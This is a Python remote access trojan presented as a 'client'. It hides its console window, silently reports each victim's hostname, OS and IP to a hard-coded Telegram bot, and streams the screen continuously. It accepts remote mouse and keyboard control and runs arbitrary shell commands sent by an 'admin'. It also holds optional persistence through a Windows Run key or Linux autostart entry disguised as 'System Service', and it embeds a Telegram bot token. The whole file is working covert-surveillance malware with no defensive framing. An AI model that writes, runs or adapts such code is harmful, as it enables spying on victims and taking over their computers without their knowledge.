#client
import socket
import threading
import pyautogui
import io
from PIL import Image, ImageGrab
import time
import requests
import sys
import os
import json
import platform
import subprocess
import uuid
import random
import string
from datetime import datetime

# Client settings
SCREEN_UPDATE_INTERVAL = 0.2  # seconds between screen updates
CLIENT_PORT = 443  # Port that the client will listen on (Changed from 9999)

# Telegram bot settings
TELEGRAM_BOT_TOKEN = "7994191615:AAG09oDgXcrvyKhejPwKdnfWlQPHec4DrfI"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
ADMIN_CHAT_ID = "7975364416"  # The admin's Telegram chat ID

# Global variables
client_id = None
server_socket = None
running = True

def capture_screen():
    """Capture the screen and return compressed JPEG image data."""
    try:
        screen = ImageGrab.grab()
        # Resize the image to reduce data size
        max_width = 1280  # Adjust as needed
        if screen.width > max_width:
            ratio = max_width / screen.width
            new_height = int(screen.height * ratio)
            screen = screen.resize((max_width, new_height), Image.LANCZOS)
            
        buffer = io.BytesIO()
        screen.save(buffer, format='JPEG', quality=30)  # Lower quality for faster transmission
        return buffer.getvalue()
    except Exception as e:
        print(f"Error capturing screen: {e}")
        return None

def send_screen_continuously(s):
    """Continuously capture and send screen updates to the admin."""
    global running
    while running:
        try:
            img = capture_screen()
            if img and s.fileno() != -1:  # Check if socket is still valid
                s.sendall(len(img).to_bytes(8, 'big') + img)
            time.sleep(SCREEN_UPDATE_INTERVAL)
        except ConnectionError:
            print("Connection closed by admin")
            break
        except Exception as e:
            print(f"Error sending screen: {e}")
            # Don't break immediately, try again after a short pause
            time.sleep(1)
            # Check if socket is still connected
            try:
                # Try sending a small packet to check connection
                s.send(b'')
            except:
                # Connection is dead, exit loop
                break

def get_local_ip():
    """Get the local IP address of this machine."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn't actually connect but gets the route
        s.connect(('8.8.8.8', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def get_system_info():
    """Get basic system information."""
    try:
        info = {
            "hostname": socket.gethostname(),
            "os": platform.system() + " " + platform.release(),
            "machine": platform.machine(),
            "ip": get_local_ip(),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        return info
    except Exception as e:
        print(f"Error getting system info: {e}")
        return {"error": str(e)}

def generate_client_id():
    """Generate a unique client ID."""
    # Using a combination of hostname, MAC address, and random string
    hostname = socket.gethostname()
    mac = uuid.getnode()
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"client_{hostname}_{mac}_{random_str}"

def send_telegram_message(message):
    """Send a message via the Telegram bot."""
    url = f"{TELEGRAM_API_URL}/sendMessage"
    data = {
        "chat_id": ADMIN_CHAT_ID,
        "text": message,
        "disable_notification": True  # Silent notification
    }
    try:
        response = requests.post(url, data=data)
        return response.json()
    except Exception as e:
        print(f"Error sending message to Telegram: {e}")
        return None

def notify_admin():
    """Notify the admin about this client via Telegram."""
    global client_id
    
    if not client_id:
        client_id = generate_client_id()
    
    system_info = get_system_info()
    local_ip = system_info["ip"]
    
    message = (
        f"🖥️ New client connected!\n"
        f"ID: {client_id}\n"
        f"Hostname: {system_info['hostname']}\n"
        f"OS: {system_info['os']}\n"
        f"IP: {local_ip}\n"
        f"Port: {CLIENT_PORT}\n"
        f"Time: {system_info['timestamp']}\n\n"
        f"To connect, use:\n/connect {client_id}:{local_ip}:{CLIENT_PORT}"
    )
    
    # print(f"Notifying admin: {message}") # Commented out for silence
    send_telegram_message(message)

def start_server():
    """Start a server to listen for incoming connections from admin."""
    global server_socket, running
    
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Allow socket to be reused immediately after it's closed
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Try binding to the port
        try:
            server_socket.bind(('0.0.0.0', CLIENT_PORT))
            # print(f"Socket bound to port {CLIENT_PORT}") # Keep commented
        except socket.error as bind_error:
            print(f"CRITICAL ERROR: Failed to bind socket to port {CLIENT_PORT}: {bind_error}")
            # Potentially notify admin about bind failure?
            # send_telegram_message(f"Client {client_id} Error: Failed to bind to port {CLIENT_PORT}. Port likely in use.")
            running = False
            return # Exit if cannot bind

        # Try listening
        try:
            server_socket.listen(1)
            # print(f"Server listening on port {CLIENT_PORT}") # Keep commented
        except socket.error as listen_error:
            print(f"CRITICAL ERROR: Failed to listen on socket: {listen_error}")
            running = False
            return # Exit if cannot listen
            
        # Notify admin (wrapped in try...except)
        try:
            notify_admin()
        except Exception as notify_error:
            print(f"WARNING: Failed to notify admin via Telegram: {notify_error}")
            # Continue running even if notification fails
        
        # print(f"Listening for admin connection on port {CLIENT_PORT}") # Commented out for silence
        
        # Wait for admin to connect
        while running:
            try:
                client_socket, addr = server_socket.accept()
                # print(f"Admin connected from {addr}") # Commented out for silence
                
                # Start sending screen updates
                screen_thread = threading.Thread(target=send_screen_continuously, args=(client_socket,), daemon=True)
                screen_thread.start()
                
                # Handle commands from admin
                handle_admin_commands(client_socket)
            except Exception as e:
                # print(f"Connection error: {e}") # Keep commented
                time.sleep(5)  # Wait before trying to accept a new connection

    except Exception as server_setup_error: # Catch other potential setup errors
        print(f"CRITICAL SERVER SETUP ERROR: {server_setup_error}")
        running = False

    finally:
        if server_socket:
            server_socket.close()

def handle_admin_commands(socket_conn):
    """Handle incoming commands from the admin."""
    global running
    
    while running:
        try:
            command = socket_conn.recv(1024).decode()
            if not command:
                break
                
            # print(f"Received command: {command}")  # Commented out for silence
            
            try:
                if command.startswith('move'):
                    parts = command.split()
                    if len(parts) >= 3:
                        _, x, y = parts
                        pyautogui.moveTo(int(x), int(y))
                elif command == 'click':
                    pyautogui.click()
                elif command == 'rightclick':
                    pyautogui.rightClick()
                elif command == 'doubleclick':
                    pyautogui.doubleClick()
                elif command.startswith('key '):
                    _, key = command.split(' ', 1)
                    pyautogui.press(key)
                elif command.startswith('type '):
                    _, text = command.split(' ', 1)
                    pyautogui.write(text)
                elif command.startswith('msg '):
                    # This command is ignored in silent mode
                    pass
                elif command == 'shutdown':
                    # Shutdown the client
                    running = False
                    break
                elif command.startswith('execute '):
                    # Execute a command (be careful with this!)
                    _, cmd = command.split(' ', 1)
                    try:
                        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
                        # Send back the first 1024 chars of output
                        socket_conn.send(f"CMD_OUTPUT:{output[:1024]}".encode())
                    except subprocess.CalledProcessError as e:
                        socket_conn.send(f"CMD_ERROR:{e.output[:1024]}".encode())
                else:
                    print(f"Unknown command: {command}")
            except Exception as e:
                print(f"Error executing command {command}: {e}")
                # Try to notify admin
                try:
                    socket_conn.send(f"CMD_ERROR:Error executing command: {str(e)}".encode())
                except:
                    pass
        except Exception as e:
            print(f"Error handling command: {e}")
            break
    
    # print("Admin disconnected") # Commented out for silence

def hide_console_window():
    """Hide the console window on Windows."""
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def add_to_startup():
    """Add the script to system startup."""
    if platform.system() == "Windows":
        try:
            # Get the path to the script
            script_path = os.path.abspath(sys.argv[0])
            
            # Create a registry entry for startup
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "System Service", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
            winreg.CloseKey(key)
            return True
        except Exception as e:
            print(f"Error adding to startup: {e}")
            return False
    elif platform.system() == "Linux":
        try:
            # Create a startup file for Linux
            script_path = os.path.abspath(sys.argv[0])
            home_dir = os.path.expanduser("~")
            
            startup_file = os.path.join(home_dir, ".config/autostart/system_service.desktop")
            os.makedirs(os.path.dirname(startup_file), exist_ok=True)
            
            with open(startup_file, "w") as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Service
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
            os.chmod(startup_file, 0o755)
            return True
        except Exception as e:
            print(f"Error adding to startup: {e}")
            return False
    return False

def main():
    # Hide console window
    hide_console_window()  # Uncommented for production use
    
    # Add to startup (uncomment to enable)
    # add_to_startup()
    
    # Start the server
    start_server()

if __name__ == "__main__":
    main()
